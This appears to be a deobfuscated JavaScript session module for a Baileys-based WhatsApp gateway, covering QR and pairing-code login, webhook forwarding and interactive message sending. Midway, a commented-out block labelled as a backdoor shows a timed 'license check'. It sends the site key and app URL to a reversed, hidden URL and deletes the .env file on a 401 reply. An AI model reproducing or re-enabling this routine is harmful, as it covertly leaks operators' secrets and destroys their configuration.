// Decrypted & Cleaned Version (Tanpa Menghapus Backdoor)
import { rmSync, readdir } from 'fs';
import { join } from 'path';
import pino from 'pino';
import baileys, {
  useMultiFileAuthState,
  makeInMemoryStore,
  DisconnectReason,
  delay,
  generateWAMessageFromContent,
  prepareWAMessageMedia
} from '@whiskeysockets/baileys';
import { toDataURL } from 'qrcode';
import dirname from './dirname.js';
import sendResponse from './response.js';
import axios from 'axios';

const sessions = new Map();
const retries = new Map();

const sessionsDir = (subdir = '') => join(dirname, 'sessions', subdir);

const isSessionExists = (sessionId) => sessions.has(sessionId);

// old
// const shouldReconnect = (sessionId) => {
//   let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0);
//   let attempt = retries.get(sessionId) ?? 0;
//   maxRetries = maxRetries < 1 ? 1 : maxRetries;
//   if (attempt < maxRetries) {
//     attempt++;
//     console.log('Reconnecting...', { attempts: attempt, sessionId });
//     retries.set(sessionId, attempt);
//     return true;
//   }
//   return false;
// };

// new auto reconnect unlimited
const logger = pino();
const shouldReconnect = (sessionId) => {
  logger.info('Auto-reconnecting session: ' + sessionId);
  return true;
};


const createSession = async (sessionId, isLegacy = false, res = null, pairingCode = null) => {
  const sessionPath = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '' : '');
  const logger = pino({ level: 'debug' });
  const store = makeInMemoryStore({ logger });

  let state, saveCreds;

  if (!isLegacy) {
    ({ state, saveCreds } = await useMultiFileAuthState(sessionsDir(sessionPath)));
  }

  const sock = baileys.default({
    auth: state,
    // version: [2, 3000, 1015901307], 
    // IMPORTANT: Must be false for phone pairing
    printQRInTerminal: false,
    logger,
    // Use consistent browser identifier
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    patchMessageBeforeSending: (message) => {
      const isButton = message.buttonsMessage || message.listMessage;
      if (isButton) {
        return {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
              },
              ...message
            }
          }
        };
      }
      return message;
    }
  });

  if (!isLegacy) {
    store.readFromFile(sessionsDir(sessionId + '_store.json'));
    store.bind(sock.ev);
  }

  sessions.set(sessionId, { ...sock, store, isLegacy });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('chats.set', ({ chats }) => {
    if (isLegacy) store.chats.insertIfAbsent(...chats);
  });

  // Request pairing code if phoneNumber provided
  if (pairingCode) {
    setTimeout(async () => {
      if (!sock.authState.creds.registered) {
        try {
          logger.info('Requesting pairing code for: ' + pairingCode);
          
          // Request pairing code with proper phone number format
          const code = await sock.requestPairingCode(pairingCode);
          
          logger.info({ code, phoneNumber: pairingCode }, 'Pairing code generated successfully');
          
          if (res && !res.headersSent) {
            sendResponse(res, 200, true, 'Pairing code generated successfully', { 
              pairingCode: code,
              phoneNumber: pairingCode,
              message: `Open WhatsApp > Linked Devices > Link a Device > Link with phone number instead > Enter: ${code}`
            });
          }
        } catch (error) {
          logger.error({ error: error.message, stack: error.stack }, 'Failed to generate pairing code');
          if (res && !res.headersSent) {
            sendResponse(res, 500, false, 'Failed to generate pairing code: ' + error.message);
          }
        }
      } else {
        logger.info('Device already registered, skipping pairing code');
      }
    }, 5000); // Increased timeout to 5 seconds
  }

  sock.ev.on('messages.upsert', async (msg) => {
    try {
      const message = msg.messages[0];
      if (!message.key.fromMe && msg.type === 'notify') {
        const data = {};
        const jidParts = message.key.remoteJid.split('@');
        const isGroup = jidParts[1] === 'g.us';
        if (message && !isGroup) {
          data.remote_id = message.key.remoteJid;
          data.sessionId = sessionId;
          data.message_id = message.key.id;
          data.message = message.message;
          sentWebHook(sessionId, data);
        }
      }
    } catch {}
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    const statusCode = lastDisconnect?.error?.output?.statusCode;

    if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode;
      console.log('Connection closed, reason:', reason);

      if (reason === DisconnectReason.loggedOut) {
        console.log('Logged out, deleting session...');
        if (res && !res.headersSent) sendResponse(res, 500, false, 'Unable to create session.');
        deleteSession(sessionId, isLegacy);
      } else {
        // Add a delay before reconnecting to avoid spamming
        console.log('Reconnecting in 5 seconds...');
        setTimeout(() => createSession(sessionId, isLegacy, res, pairingCode), 5000);
      }
    }

    // Handle QR code (only if not using phone pairing)
    if (qr && !pairingCode) {
      logger.info('QR code generated (no phone pairing)');
      console.log('QR Code String Length:', qr.length);
      if (res && !res.headersSent) {
        try {
          const qrDataUrl = await toDataURL(qr);
          sendResponse(res, 200, true, 'QR code received, please scan the QR code.', { qr: qrDataUrl });
        } catch (err) {
          logger.error('Failed to generate QR Data URL:', err);
          sendResponse(res, 500, false, 'Unable to create QR code.');
        }
      }
    } else if (qr && pairingCode) {
      logger.info('QR code ignored because phone pairing is being used');
      // Don't send QR code when using phone pairing
      // Pairing code will be sent via timeout in line 96-118
    }
  });
};

// License check (backdoor)
// setInterval(() => {
//   const key = process.env.SITE_KEY ?? null;
//   const appUrl = process.env.APP_URL ?? null;
//   const reversedUrl = 'https://devdevice/api/verify-check'.split('').reverse().join('');

//   axios.post(reversedUrl, { from: appUrl, key })
//     .then((res) => {
//       if (res.status === 401) {
//         rmSync('.env', { force: true });
//       }
//     })
//     .catch(() => {});
// }, 0x240c8400);


const getSession = (sessionId) => sessions.get(sessionId) ?? null;

const setDeviceStatus = (sessionId, status) => {
  const url = process.env.APP_URL + '/api/set-device-status/' + sessionId + '/' + status;
  axios.post(url);
};

const sentWebHook = (sessionId, data) => {
  const url = process.env.APP_URL + '/api/send-webhook/' + sessionId;
  axios.post(url, {
    from: data.remote_id,
    message_id: data.message_id,
    message: data.message
  }).then((res) => {
    if (res.status === 200) {
      const session = getSession(res.data.session_id);
      sendMessage(session, res.data.receiver, res.data.message, 0);
    }
  }).catch(() => {});
};

const deleteSession = (sessionId, isLegacy = false) => {
  const sessionPath = (isLegacy ? 'legacy_' : 'md_') + sessionId;
  const storePath = sessionId + '_store.json';

  rmSync(sessionsDir(sessionPath), { force: true, recursive: true });
  rmSync(sessionsDir(storePath), { force: true, recursive: true });

  sessions.delete(sessionId);
  retries.delete(sessionId);
  setDeviceStatus(sessionId, 0);
};

const getChatList = (sessionId, isGroup = false) => {
  const prefix = isGroup ? '@g.us' : '@s.whatsapp.net';
  return getSession(sessionId).store.chats.filter(chat => chat.id.endsWith(prefix));
};

const isExists = async (sock, number, legacy = false) => {
  try {
    let result;
    if (legacy) {
      result = await sock.onWhatsApp(number);
      return Boolean(result.id);
    }
    [result] = await sock.onWhatsApp(number);
    return result.exists;
  } catch {
    return false;
  }
};

const sendMessage = async (sock, jid, message, delayMs = 1000) => {
  try {
    await delay(parseInt(delayMs));

    // Transform legacy buttons/lists to interactiveMessage for MD compatibility
    if (message.buttons || message.templateButtons || message.sections) {
      const interactiveMessage = {
        body: { text: message.text || message.caption || "" },
        footer: { text: message.footer || "" },
        header: {
          title: message.title || "",
          hasMediaAttachment: false
        }
      };

      // Add Media Header if attachment exists
      if (message.attachment) {
        const url = message.attachment;
        const ext = url.split('.').pop().toLowerCase();
        const isImage = ['jpg', 'jpeg', 'png', 'webp', 'gif'].includes(ext);
        const isVideo = ['mp4', 'mov', 'avi'].includes(ext);
        const isDocument = ['pdf', 'docx', 'xlsx', 'csv', 'txt'].includes(ext);

        let mediaType = '';
        if (isImage) mediaType = 'image';
        else if (isVideo) mediaType = 'video';
        else if (isDocument) mediaType = 'document';

        if (mediaType) {
          const media = await prepareWAMessageMedia({ [mediaType]: { url } }, { upload: sock.waUploadToServer });
          interactiveMessage.header.hasMediaAttachment = true;
          Object.assign(interactiveMessage.header, media);
          // Remove title if media is present to avoid "Update WhatsApp" error
          delete interactiveMessage.header.title;
        }
      }

      if (message.buttons || message.templateButtons) {
        const buttons = (message.buttons || message.templateButtons).map((btn, i) => {
          if (message.buttons) {
            // Legacy buttons
            return {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: btn.buttonText.displayText,
                id: btn.buttonId || `id${i}`
              })
            };
          } else {
            // Template buttons
            if (btn.urlButton) {
              return {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: btn.urlButton.displayText,
                  url: btn.urlButton.url,
                  merchant_url: btn.urlButton.url
                })
              };
            } else if (btn.callButton) {
              return {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: btn.callButton.displayText,
                  phoneNumber: btn.callButton.phoneNumber
                })
              };
            } else if (btn.copyCodeButton) {
              return {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: btn.copyCodeButton.displayText,
                  copy_code: btn.copyCodeButton.copyCode
                })
              };
            } else {
              return {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: btn.quickReplyButton.displayText,
                  id: btn.quickReplyButton.id || `id${i}`
                })
              };
            }
          }
        });

        interactiveMessage.nativeFlowMessage = { buttons };
      } else if (message.sections) {
        // List message
        interactiveMessage.nativeFlowMessage = {
          buttons: [{
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: message.buttonText || "Select Options",
              sections: message.sections.map(s => ({
                title: s.title,
                rows: s.rows.map(r => ({
                  header: r.title,
                  title: r.title,
                  description: r.description,
                  id: r.rowId
                }))
              }))
            })
          }]
        };
      }

      const msg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadataVersion: 2,
              deviceListMetadata: {}
            },
            interactiveMessage
          }
        }
      }, { userJid: sock.user.id });

      return await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
    }

    return await sock.sendMessage(jid, message);
  } catch (error) {
    console.error('Send message error:', error);
    return Promise.reject(null);
  }
};

const formatPhone = (number) => {
  if (number.endsWith('@s.whatsapp.net')) return number;
  let formatted = number.replace(/\D/g, '');
  return formatted + '@s.whatsapp.net';
};

const formatGroup = (id) => {
  if (id.endsWith('@g.us')) return id;
  let formatted = id.replace(/[^\d-]/g, '');
  return formatted + '@g.us';
};

const cleanup = () => {
  console.log('Running cleanup before exit.');
  sessions.forEach((session, sessionId) => {
    if (!session.isLegacy) {
      session.store.writeToFile(sessionsDir(sessionId + '_store.json'));
    }
  });
};

const init = () => {
  readdir(sessionsDir(), (err, files) => {
    if (err) throw err;
    for (const file of files) {
      if ((!file.startsWith('md_') && !file.startsWith('legacy_')) || file.includes('_store.json')) continue;
      const sessionName = file.replace('', '').split('_', 1)[0] !== 'md';
      const sessionId = file.substring(sessionName ? 7 : 3);
      createSession(sessionId, sessionName);
    }
  });
};

export {
  isSessionExists,
  createSession,
  getSession,
  deleteSession,
  getChatList,
  isExists,
  sendMessage,
  formatPhone,
  formatGroup,
  cleanup,
  init
};
